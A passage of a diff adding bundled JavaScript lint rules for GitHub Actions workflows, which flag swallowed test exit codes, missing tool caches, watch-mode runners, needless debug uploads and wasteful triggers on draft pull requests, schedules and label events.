+          for (const { text: text4, offset } of scriptLines2(step.run?.value ?? "")) {
+            const swallowed = swallowedTest(text4);
+            if (!swallowed) continue;
+            report({
+              path: workflow.path,
+              line: direct2 ? runLine(step, offset) : stepLine(owner),
+              key: `${step.key}:${offset}:or-true`,
+              message: `\`${swallowed} || true\` discards the test exit code, so failing tests leave the job green.`,
+              suggestion: "Drop the `|| true`. To run follow-up commands regardless, put them in a later step with `if: ${{ !cancelled() }}`."
+            });
+          }
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/playwright-browser-cache.ts
+var PLAYWRIGHT = /* @__PURE__ */ new Set(["playwright"]);
+var PLAYWRIGHT_IMAGE = /(^|\/)mcr\.microsoft\.com\/playwright(\/|:|$)/i;
+var playwright_browser_cache_default = defineRule({
+  meta: {
+    id: "testing/playwright-browser-cache",
+    ruleset: "testing",
+    description: "Jobs that download Playwright browsers should cache them or run in the Playwright container image.",
+    rationale: "`playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://playwright.dev/docs/ci",
+      "https://playwright.dev/docs/browsers#managing-browser-binaries",
+      "https://github.com/actions/cache"
+    ],
+    impact: "medium",
+    example: {
+      bad: "- run: npm ci\n- run: npx playwright install --with-deps\n- run: npx playwright test",
+      good: "- run: npm ci\n- uses: actions/cache@v4\n  with:\n    path: ~/.cache/ms-playwright\n    key: playwright-${{ runner.os }}-${{ hashFiles('package-lock.json') }}\n- run: npx playwright install --with-deps\n- run: npx playwright test"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        const install = jobCommands(project, workflow, job).find((entry2) => {
+          const words2 = toolInvocation(entry2.command, PLAYWRIGHT);
+          return words2?.[1] === "install" && !words2.slice(2).some((word) => word === "--help" || word === "--dry-run");
+        });
+        if (!install) continue;
+        const image = job.containerImage;
+        if (image && (image.kind !== "literal" || PLAYWRIGHT_IMAGE.test(image.value))) continue;
+        const all = project.expandedSteps(job);
+        if (cacheCovers(all, /ms-playwright|playwright/i, /playwright/i)) continue;
+        const browsersPath = [workflow.env, job.env, ...all.map((step) => step.env)].some((env) => "PLAYWRIGHT_BROWSERS_PATH" in env);
+        if (browsersPath && cacheCovers(all, /./)) continue;
+        if (all.some((step) => step.uses?.action.kind === "remote" && /playwright/i.test(step.uses.action.name ?? ""))) continue;
+        report({
+          path: workflow.path,
+          line: install.direct ? install.line : stepLine(install.owner),
+          key: `${job.key}:playwright-install`,
+          message: "Playwright browsers are downloaded on every run without a cache.",
+          suggestion: "Cache ~/.cache/ms-playwright (%USERPROFILE%\\AppData\\Local\\ms-playwright on Windows) with actions/cache keyed on the Playwright version and run `playwright install` (or only `install-deps` on a hit), or run the job in the mcr.microsoft.com/playwright container image."
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/tool-incremental-cache.ts
+var NAMES = /* @__PURE__ */ new Set(["eslint", "tsc", "jest"]);
+var SKIP = /* @__PURE__ */ new Set(["--version", "-v", "--help", "-h", "--init", "--showConfig", "--print-config", "--watch", "-w", "--watchAll", "--listTests", "--no-cache", "--clearCache"]);
+var COVERAGE2 = {
+  eslint: /eslint|node_modules\/\.cache/i,
+  tsc: /tsbuildinfo|tsc|typescript|node_modules\/\.cache/i,
+  jest: /jest/i
+};
+function tsconfigIncremental(project) {
+  return [...project.files.values()].some(
+    (file) => /(^|\/)tsconfig[\w.-]*\.json$/i.test(file.path) && /"(?:incremental|composite)"\s*:\s*true/.test(file.content)
+  );
+}
+function finding(tool2, words2, project) {
+  switch (tool2) {
+    case "eslint":
+      return words2.some((word) => word === "--cache" || word.startsWith("--cache=")) ? {
+        message: "ESLint runs with `--cache`, but the cache file is not restored between runs, so every run is cold.",
+        suggestion: "Point `--cache-location` at a directory (for example node_modules/.cache/eslint/) and restore it with actions/cache."
+      } : {
+        message: "ESLint lints every file on every run because `--cache` is not used.",
+        suggestion: "Add `--cache --cache-strategy content --cache-location node_modules/.cache/eslint/` and restore that directory with actions/cache."
+      };
+    case "tsc":
+      return words2.some((word) => ["--incremental", "-b", "--build", "--composite"].includes(word)) || tsconfigIncremental(project) ? {
+        message: "tsc builds incrementally, but its .tsbuildinfo output is not restored between runs, so every run is a full check.",
+        suggestion: "Restore the .tsbuildinfo file(s) (see `tsBuildInfoFile`) with actions/cache keyed on the lockfile and tsconfig."
+      } : {
+        message: "tsc re-checks the whole program on every run (no `--incremental` or build mode, and no cached .tsbuildinfo).",
+        suggestion: "Enable `incremental` (with an explicit `tsBuildInfoFile`) or use `tsc -b`, and restore the .tsbuildinfo file with actions/cache."
+      };
+    case "jest":
+      return {
+        message: "Jest re-transforms every file on every run because its cache directory is not restored.",
+        suggestion: "Set `--cacheDirectory` (or `cacheDirectory` in the Jest config) to a workspace path and restore it with actions/cache."
+      };
+  }
+}
+var tool_incremental_cache_default = defineRule({
+  meta: {
+    id: "testing/tool-incremental-cache",
+    ruleset: "testing",
+    description: "ESLint, tsc and Jest should keep their incremental caches between CI runs.",
+    rationale: "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://eslint.org/docs/latest/use/command-line-interface#caching",
+      "https://www.typescriptlang.org/tsconfig/#incremental",
+      "https://jestjs.io/docs/cli#--cachedirectory",
+      "https://github.com/actions/cache"
+    ],
+    impact: "low",
+    example: {
+      bad: "- run: npm ci\n- run: npx eslint .",
+      good: "- run: npm ci\n- uses: actions/cache@v4\n  with:\n    path: node_modules/.cache/eslint\n    key: eslint-${{ hashFiles('package-lock.json') }}-${{ github.sha }}\n    restore-keys: eslint-${{ hashFiles('package-lock.json') }}-\n- run: npx eslint . --cache --cache-location node_modules/.cache/eslint/"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        let all;
+        const seen = /* @__PURE__ */ new Set();
+        for (const entry2 of jobCommands(project, workflow, job)) {
+          const words2 = toolInvocation(entry2.command, NAMES);
+          const tool2 = words2?.[0];
+          if (!words2 || !tool2 || seen.has(tool2)) continue;
+          if (words2.slice(1).some((word) => SKIP.has(word) || word.startsWith("--watch"))) continue;
+          seen.add(tool2);
+          all ??= project.expandedSteps(job);
+          if (cacheCovers(all, COVERAGE2[tool2], COVERAGE2[tool2])) continue;
+          report({
+            path: workflow.path,
+            line: entry2.direct ? entry2.line : stepLine(entry2.owner),
+            key: `${job.key}:${tool2}`,
+            ...finding(tool2, words2, project)
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/unconditional-debug-upload.ts
+var import_yaml17 = __toESM(require_dist(), 1);
+var DEBUG_PATH = /(^|[/\\])(?:playwright-report|test-results|traces?|videos?|screenshots?|cypress\/(?:videos|screenshots))([/\\*]|$)/i;
+var HEAVY_PATH = /(^|[/\\])(?:traces?|videos?|screenshots?|cypress\/(?:videos|screenshots))([/\\*]|$)|\.(?:zip|webm|mp4|png)$/i;
+var MACHINE_READABLE = /junit|\.(?:xml|json|trx|sarif|lcov)$|coverage/i;
+var SUCCESS_ONLY = /^\s*(?:\$\{\{\s*)?success\(\)\s*(?:\}\}\s*)?$/;
+var ALWAYS = /^\s*(?:\$\{\{\s*)?(?:always\(\)|!\s*cancelled\(\))\s*(?:\}\}\s*)?$/;
+function downloaded(workflows, name) {
+  for (const { step } of stepsUsing(workflows, "actions/download-artifact")) {
+    const wanted = step.with.get("name") ?? step.with.get("pattern");
+    if (!wanted || wanted.kind !== "literal" || name === void 0) return true;
+    const pattern = String(wanted.value);
+    if (pattern === name) return true;
+    const regex = new RegExp(`^${pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*")}$`);
+    if (regex.test(name)) return true;
+  }
+  return false;
+}
+var unconditional_debug_upload_default = defineRule({
+  meta: {
+    id: "testing/unconditional-debug-upload",
+    ruleset: "testing",
+    description: "Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail.",
+    rationale: "A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/expressions#status-check-functions",
+      "https://github.com/actions/upload-artifact",
+      "https://playwright.dev/docs/ci-intro"
+    ],
+    impact: "low",
+    fixable: true,
+    example: {
+      bad: "- run: npx playwright test\n- uses: actions/upload-artifact@v4\n  with:\n    name: playwright-report\n    path: playwright-report/",
+      good: "- run: npx playwright test\n- uses: actions/upload-artifact@v4\n  if: failure()\n  with:\n    name: playwright-report\n    path: playwright-report/"
+    }
+  },
+  check({ project, report }) {
+    for (const { workflow, job, step } of steps(project.workflows)) {
+      if (step.uses?.action.kind !== "remote" || step.uses.action.name !== "actions/upload-artifact") continue;
+      const pathEntry = step.with.get("path");
+      if (!pathEntry || pathEntry.kind !== "literal" || typeof pathEntry.value !== "string") continue;
+      const paths = listOf(pathEntry.value).filter((entry2) => !entry2.startsWith("!"));
+      if (paths.length === 0 || !paths.every((entry2) => DEBUG_PATH.test(entry2) && !MACHINE_READABLE.test(entry2))) continue;
+      const nameEntry = step.with.get("name");
+      if (nameEntry && (nameEntry.kind !== "literal" || MACHINE_READABLE.test(String(nameEntry.value)))) continue;
+      const name = nameEntry === void 0 ? "artifact" : String(nameEntry.value);
+      if (downloaded(project.workflows, name)) continue;
+      const condition = step.if;
+      const line = step.uses.line;
+      const earlier = job.steps.slice(0, job.steps.indexOf(step));
+      if ((condition === void 0 || SUCCESS_ONLY.test(condition)) && earlier.some((other) => continueOnErrorTrue(workflow.source, stepNode2(workflow.source, other)) && outcomeInspected(job.steps, other))) {
+        continue;
+      }
+      if (condition !== void 0 && !SUCCESS_ONLY.test(condition)) {
+        if (!ALWAYS.test(condition) || !paths.every((entry2) => HEAVY_PATH.test(entry2))) continue;
+        report({
+          path: workflow.path,
+          line,
+          key: `${step.key}:always`,
+          message: `Traces, videos or screenshots (${paths.join(", ")}) are uploaded on every run, including green ones.`,
+          suggestion: "Use `if: failure()` so the heavy debugging artifacts upload only when a test fails."
+        });
+        continue;
+      }
+      let applied;
+      if (condition === void 0) {
+        const node = stepNode2(workflow.source, step);
+        const file = project.files.get(workflow.path);
+        const first = file ? lineText(file.content, step.line) : "";
+        const dash = /^(\s*)-\s+[\w-]+:/.exec(first);
+        if (file && dash && (0, import_yaml17.isMap)(node) && !node.flow && lineOfNode(workflow.source, node) === step.line && !/[|>][-+0-9]*\s*(#.*)?$/.test(first)) {
+          applied = fix("Upload only when the job fails", insertLinesAfter(file, step.line, [`${dash[1] ?? ""}  if: failure()`]));
+        }
+      }
+      report({
+        path: workflow.path,
+        line,
+        key: step.key,
+        message: condition === void 0 ? `Debugging output (${paths.join(", ")}) is uploaded only when the tests pass, which is when it is not needed.` : `Debugging output (${paths.join(", ")}) is uploaded only on success (\`if: success()\`).`,
+        suggestion: "Add `if: failure()` so the upload runs when a test fails and is skipped on green runs.",
+        ...applied ? { fix: applied } : {}
+      });
+    }
+  }
+});
+
+// src/lint/rules/testing/watch-mode-in-ci.ts
+var TOOLS = /* @__PURE__ */ new Set(["jest", "vitest", "ng", "karma", "tsc", "mocha"]);
+function flagOn(args, ...names) {
+  return args.some((arg) => {
+    const [name, value2] = arg.split("=", 2);
+    return names.includes(name ?? "") && (value2 === void 0 || value2 === "true");
+  });
+}
+function flagOff(args, name, ...extra) {
+  return args.some((arg, index) => arg === `${name}=false` || extra.includes(arg) || arg === name && args[index + 1] === "false");
+}
+function karmaSingleRun(project) {
+  return [...project.files.values()].some((file) => /(^|\/)karma\.conf[\w.-]*\.[cm]?[jt]s$/i.test(file.path) && /singleRun\s*:\s*true/.test(file.content));
+}
+function angularNoWatch(project) {
+  return [...project.files.values()].some(
+    (file) => /(^|\/)angular\.json$/i.test(file.path) && /"watch"\s*:\s*false|@angular\/build:unit-test/.test(file.content)
+  );
+}
+function watchMode(command, project) {
+  const words2 = toolInvocation(command, TOOLS);
+  if (!words2) return void 0;
+  const [tool2 = "", sub = "", ...rest] = words2;
+  const args = [sub, ...rest];
+  switch (tool2) {
+    case "jest":
+      return flagOn(args, "--watch", "--watchAll") ? "jest --watch" : void 0;
+    case "vitest":
+      if (sub === "watch" || sub === "dev") return `vitest ${sub}`;
+      return flagOn(args, "--watch", "-w") ? "vitest --watch" : void 0;
+    case "tsc":
+    case "mocha":
+      return flagOn(args, "--watch", "-w") ? `${tool2} --watch` : void 0;
+    case "ng":
+      if (sub !== "test" && sub !== "t") return void 0;
+      if (flagOff(args, "--watch", "--no-watch")) return void 0;
+      if (flagOn(args, "--watch")) return "ng test --watch";
+      return karmaSingleRun(project) || angularNoWatch(project) ? void 0 : "ng test";
+    case "karma":
+      if (sub !== "start") return void 0;
+      if (flagOn(args, "--single-run", "--singleRun") || flagOff(args, "--watch", "--no-watch", "--no-auto-watch")) return void 0;
+      if (flagOff(args, "--single-run", "--no-single-run")) return "karma start --no-single-run";
+      return karmaSingleRun(project) ? void 0 : "karma start";
+  }
+  return void 0;
+}
+function scriptName2(command) {
+  const [manager = "", ...args] = toolWords(command);
+  if (!["npm", "yarn", "pnpm", "bun"].includes(manager)) return void 0;
+  const positional = args.filter((word) => !word.startsWith("-"));
+  if (positional[0] === "run" || positional[0] === "run-script") return positional[1];
+  if (positional[0] === "test" || positional[0] === "t") return "test";
+  return manager === "yarn" || manager === "pnpm" ? positional[0] : void 0;
+}
+var watch_mode_in_ci_default = defineRule({
+  meta: {
+    id: "testing/watch-mode-in-ci",
+    ruleset: "testing",
+    description: "Test runners and compilers in CI should run once instead of in watch mode.",
+    rationale: "A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://jestjs.io/docs/cli#--watch",
+      "https://vitest.dev/guide/cli.html#vitest-run",
+      "https://karma-runner.github.io/latest/config/configuration-file.html#singlerun",
+      "https://angular.dev/cli/test"
+    ],
+    impact: "high",
+    example: {
+      bad: "- run: npx ng test",
+      good: "- run: npx ng test --watch=false --browsers=ChromeHeadless"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        for (const entry2 of jobCommands(project, workflow, job)) {
+          let found = watchMode(entry2.command, project);
+          let via = "";
+          if (!found && !/--watch[= ]false|--no-watch|--single-?run(?!=false)|--singleRun|--run\b|--ci\b/.test(entry2.command)) {
+            const name = scriptName2(entry2.command);
+            const dir = name === void 0 ? void 0 : workingDirectory2(workflow, job, entry2.step);
+            const script = name === void 0 || dir === void 0 ? void 0 : packageScript(project, dir, name);
+            found = script?.split(/&&|\|\||;/).map((part2) => watchMode(part2.trim(), project)).find(Boolean);
+            if (found) via = ` (via the \`${name ?? ""}\` package script)`;
+          }
+          if (!found) continue;
+          report({
+            path: workflow.path,
+            line: entry2.direct ? entry2.line : stepLine(entry2.owner),
+            key: `${entry2.step.key}:${found}`,
+            message: `\`${found}\` runs in watch mode${via} and will not exit until the job times out.`,
+            suggestion: "Run once: `vitest run`, jest without `--watch`/`--watchAll`, `ng test --watch=false`, `karma start --single-run`, or tsc/mocha without `--watch`."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/testing/index.ts
+var rules10 = [
+  playwright_browser_cache_default,
+  tool_incremental_cache_default,
+  watch_mode_in_ci_default,
+  unconditional_debug_upload_default,
+  masked_failures_default,
+  cache_disabled_install_default,
+  fixed_sleep_default
+];
+
+// src/lint/rules/triggers/shared.ts
+var CHANGE_ACTIONS2 = /* @__PURE__ */ new Set([
+  "dorny/paths-filter",
+  "tj-actions/changed-files",
+  "step-security/changed-files",
+  "technote-space/get-diff-action",
+  "jitterbit/get-changed-files",
+  "ana06/get-changed-files",
+  "trilom/file-changes-action",
+  "marceloprado/has-changed-path",
+  "yumemi-inc/changed-files"
+]);
+var PR_AUTOMATION = /label(?:l)?er|labels|triage|stale|greet|welcome|assign|auto-?merge|release-drafter|semantic-pr|pr-title/i;
+var CODE_TYPES = /* @__PURE__ */ new Set(["opened", "synchronize", "reopened"]);
+function jobNode4(workflow, job) {
+  const jobs = field(workflow.source, workflow.source.doc.contents, "jobs");
+  return field(workflow.source, jobs?.value, job.id)?.value;
+}
+function strategyField(workflow, job, key2) {
+  const strategy = field(workflow.source, jobNode4(workflow, job), "strategy");
+  return field(workflow.source, strategy?.value, key2);
+}
+function matrixSize(job) {
+  const matrix = job.matrix;
+  if (!matrix || "__expression" in matrix) return void 0;
+  const axes = Object.entries(matrix).filter(([key2]) => key2 !== "include" && key2 !== "exclude");
+  const include = matrix.include;
+  const exclude = matrix.exclude;
+  if (include !== void 0 && !Array.isArray(include)) return void 0;
+  if (exclude !== void 0 && !Array.isArray(exclude)) return void 0;
+  if (axes.length === 0) return include?.length ?? 0;
+  let product = 1;
+  for (const [, value2] of axes) {
+    if (!Array.isArray(value2)) return void 0;
+    product *= value2.length;
+  }
+  return Math.max(0, product - (exclude?.length ?? 0));
+}
+function ancestors(workflow, job) {
+  const byId = new Map(workflow.jobs.map((candidate) => [candidate.id, candidate]));
+  const seen = /* @__PURE__ */ new Set();
+  const result = [];
+  const queue = [...job.needs];
+  for (let id = queue.shift(); id !== void 0; id = queue.shift()) {
+    if (seen.has(id)) continue;
+    seen.add(id);
+    const found = byId.get(id);
+    if (!found) continue;
+    result.push(found);
+    queue.push(...found.needs);
+  }
+  return result;
+}
+function runsChecks(job) {
+  return job.steps.some(
+    (step) => step.run !== void 0 || step.uses?.action.kind === "local" || step.uses?.action.name === "actions/checkout"
+  );
+}
+
+// src/lint/rules/triggers/draft-pr-gating.ts
+var DRAFT = /\bdraft\b/;
+function expensiveReason(job, maxSteps, maxTimeout) {
+  if (job.uses) return void 0;
+  if (job.matrix && "__expression" in job.matrix) return "dynamic matrix";
+  const size = matrixSize(job);
+  if (size !== void 0 && size >= 2) return `${size}-leg matrix`;
+  if (job.steps.length > maxSteps) return `${job.steps.length} steps`;
+  const timeout = job.timeoutMinutes;
+  if (timeout?.kind === "literal" && typeof timeout.value === "number" && timeout.value > maxTimeout) {
+    return `${timeout.value}-minute timeout`;
+  }
+  return void 0;
+}
+function skipsDrafts(workflow, job) {
+  return [job, ...ancestors(workflow, job)].some((candidate) => candidate.if !== void 0 && DRAFT.test(candidate.if));
+}
+var draft_pr_gating_default = defineRule({
+  meta: {
+    id: "triggers/draft-pr-gating",
+    ruleset: "triggers",
+    description: "Skip expensive pull request jobs while the pull request is still a draft.",
+    rationale: "Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: { maxSteps: 10, maxTimeout: 15 },
+    validateOptions: (options) => Object.entries(options).filter(([, value2]) => typeof value2 !== "number" || value2 <= 0).map(([key2]) => `${key2} must be a positive number`),
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request",
+      "https://docs.github.com/en/webhooks/webhook-events-and-payloads#pull_request"
+    ],
+    impact: "medium",
+    example: {
+      bad: "on: pull_request\njobs:\n  test:\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]",
+      good: "on:\n  pull_request:\n    types: [opened, synchronize, reopened, ready_for_review]\njobs:\n  test:\n    if: github.event.pull_request.draft == false\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]"
+    }
+  },
+  check({ project, options, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || isDeployLike(workflow)) continue;
+      const pr = trigger(workflow, "pull_request");
+      if (!pr) continue;
+      if (pr.types?.includes("ready_for_review")) continue;
+      if (pr.types && !pr.types.some((type) => CODE_TYPES.has(type))) continue;
+      const expensive = workflow.jobs.flatMap((job) => {
+        const reason = expensiveReason(job, options.maxSteps, options.maxTimeout);
+        return reason && !skipsDrafts(workflow, job) ? [{ job, reason }] : [];
+      });
+      if (expensive.length === 0) continue;
+      const list3 = expensive.map(({ job, reason }) => `"${job.id}" (${reason})`).join(", ");
+      report({
+        path: workflow.path,
+        line: pr.line,
+        key: "on.pull_request",
+        message: `Expensive jobs run on every push to draft pull requests: ${list3}.`,
+        suggestion: "Add `if: github.event.pull_request.draft == false` to the expensive jobs (or to a job they all need) and include `ready_for_review` in `on.pull_request.types` alongside `opened`, `synchronize`, and `reopened` so they run once the pull request is marked ready.",
+        related: expensive.map(({ job }) => ({ path: workflow.path, line: job.line })),
+        confidence: "medium"
+      });
+    }
+  }
+});
+
+// src/lint/rules/triggers/frequent-schedule.ts
+function range(text4) {
+  if (text4 === "*") return [0, 59];
+  const match2 = /^(\d{1,2})(?:-(\d{1,2}))?$/.exec(text4);
+  if (!match2) return void 0;
+  const start2 = Number(match2[1]);
+  const end = match2[2] === void 0 ? start2 : Number(match2[2]);
+  return start2 <= end && end <= 59 ? [start2, end] : void 0;
+}
+function cronMinutes(minuteField) {
+  const minutes = /* @__PURE__ */ new Set();
+  for (const part2 of minuteField.split(",")) {
+    const [base2 = "", stepText, extra] = part2.split("/");
+    if (extra !== void 0) return void 0;
+    const step = stepText === void 0 ? 1 : Number(stepText);
+    if (!Number.isInteger(step) || step < 1) return void 0;
+    let bounds = range(base2);
+    if (bounds && stepText !== void 0 && /^\d+$/.test(base2)) bounds = [bounds[0], 59];
+    if (!bounds) return void 0;
+    for (let minute = bounds[0]; minute <= bounds[1]; minute += step) minutes.add(minute);
+  }
+  return minutes;
+}
+var frequent_schedule_default = defineRule({
+  meta: {
+    id: "triggers/frequent-schedule",
+    ruleset: "triggers",
+    description: "Avoid scheduled workflows that run more often than every 15 minutes.",
+    rationale: "A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: { maxRunsPerHour: 4 },
+    validateOptions: (options) => Object.entries(options).filter(([, value2]) => typeof value2 !== "number" || value2 < 1).map(([key2]) => `${key2} must be a number of at least 1`),
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#schedule"
+    ],
+    impact: "medium",
+    example: {
+      bad: "on:\n  schedule:\n    - cron: '*/5 * * * *'",
+      good: "on:\n  schedule:\n    - cron: '*/30 * * * *'\n  workflow_dispatch:"
+    }
+  },
+  check({ project, options, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow") continue;
+      const source = workflow.source;
+      const on = field(source, source.doc.contents, "on");
+      const schedule = field(source, on?.value, "schedule");
+      for (const entry2 of items(source, schedule?.value)) {
+        const cron = field(source, entry2, "cron");
+        const expression = stringValue(cron?.value)?.trim();
+        if (!cron || !expression || expression.includes("${{")) continue;
+        const parts2 = expression.split(/\s+/);
+        if (parts2.length !== 5) continue;
+        const [minuteField = "", hourField = ""] = parts2;
+        const minutes = cronMinutes(minuteField);
+        if (!minutes || minutes.size <= options.maxRunsPerHour) continue;
+        const scope2 = hourField === "*" ? "every hour" : "during its scheduled hours";
+        report({
+          path: workflow.path,
+          line: cron.line,
+          key: `on.schedule.${expression}`,
+          message: `Schedule "${expression}" runs ${minutes.size} times an hour ${scope2}, more than the limit of ${options.maxRunsPerHour}.`,
+          suggestion: "Trigger the workflow from the event it is waiting for (`push`, `workflow_dispatch`, `repository_dispatch`) or widen the cron interval to every 15 minutes or more.",
+          confidence: "high"
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/triggers/missing-job-condition-matrix.ts
+function changeJobs(workflow) {
+  return workflow.jobs.filter((job) => {
+    if (job.uses || job.matrix) return false;
+    if (!job.steps.some((step) => step.uses?.action.name !== void 0 && CHANGE_ACTIONS2.has(step.uses.action.name))) return false;
+    const outputs = new RegExp(`needs\\.${job.id.replace(/[.*+?^${}()|[\]\\-]/g, "\\$&")}\\.outputs\\.`);
+    return workflow.jobs.some(
+      (other) => other !== job && other.needs.includes(job.id) && other.if !== void 0 && outputs.test(other.if)
+    );
+  });
+}
+var missing_job_condition_matrix_default = defineRule({
+  meta: {
+    id: "triggers/missing-job-condition-matrix",
+    ruleset: "triggers",
+    description: "Gate matrix jobs on the workflow's existing change-detection job.",
+    rationale: "When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idif",
+      "https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs"
+    ],
+    impact: "medium",
+    example: {
+      bad: "jobs:\n  changes: ...\n  lint:\n    needs: changes\n    if: needs.changes.outputs.src == 'true'\n  test:\n    strategy:\n      matrix:\n        node: [18, 20, 22]",
+      good: "jobs:\n  changes: ...\n  test:\n    needs: changes\n    if: needs.changes.outputs.src == 'true'\n    strategy:\n      matrix:\n        node: [18, 20, 22]"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || !isPullRequestWorkflow(workflow) || isDeployLike(workflow)) continue;
+      const detectors = changeJobs(workflow);
+      if (detectors.length === 0) continue;
+      for (const job of workflow.jobs) {
+        if (job.uses || job.if !== void 0 || detectors.includes(job)) continue;
+        const size = matrixSize(job);
+        if (size === void 0 || size < 2) continue;
+        const upstream = new Set(ancestors(workflow, job).map((candidate) => candidate.id));
+        if (detectors.some((detector2) => upstream.has(detector2.id))) continue;
+        const detector = detectors[0];
+        report({
+          path: workflow.path,
+          line: job.line,
+          key: `jobs.${job.id}`,
+          message: `Matrix job "${job.id}" (${size} legs) runs on every pull request even though job "${detector.id}" already detects which paths changed.`,
+          suggestion: `Add \`needs: ${detector.id}\` and an \`if:\` on \`needs.${detector.id}.outputs.<filter>\` so the matrix skips when its inputs are unchanged.`,
+          related: [{ path: workflow.path, line: detector.line }],
+          confidence: "medium"
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/triggers/noisy-pr-types.ts
+var METADATA_TYPES = /* @__PURE__ */ new Set([
+  "edited",
+  "labeled",
+  "unlabeled",
+  "assigned",
+  "unassigned",
+  "review_requested",
+  "review_request_removed",
+  "milestoned",
+  "demilestoned",
+  "locked",
+  "unlocked",
+  "auto_merge_enabled",
+  "auto_merge_disabled"
+]);
+var EVENT_FILTER = /github\.event\.(?:action|label\b|changes\b|assignee\b|requested_reviewer\b|pull_request\.labels)|\.labels\b/;
+var noisy_pr_types_default = defineRule({
+  meta: {
+    id: "triggers/noisy-pr-types",
+    ruleset: "triggers",
+    description: "Do not re-run build and test workflows on pull request metadata events such as labels or edits.",
+    rationale: "Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request",
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/contexts#github-context"
+    ],
+    impact: "medium",
+    example: {
+      bad: "on:\n  pull_request:\n    types: [opened, synchronize, edited, labeled]",
+      good: "on:\n  pull_request:\n    types: [opened, synchronize, reopened]"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || isDeployLike(workflow)) continue;
+      if (PR_AUTOMATION.test(workflow.path) || workflow.name !== void 0 && PR_AUTOMATION.test(workflow.name)) continue;
+      if (!workflow.jobs.some((job) => job.uses !== void 0 || runsChecks(job))) continue;
+      const content = project.files.get(workflow.path)?.content ?? "";
+      if (EVENT_FILTER.test(content)) continue;
+      for (const event of ["pull_request", "pull_request_target"]) {
+        const pr = workflow.triggers.find((candidate) => candidate.event === event);
+        const noisy = pr?.types?.filter((type) => METADATA_TYPES.has(type)) ?? [];
+        if (!pr || noisy.length === 0) continue;
+        report({
+          path: workflow.path,
+          line: pr.line,
+          key: `on.${event}.types`,
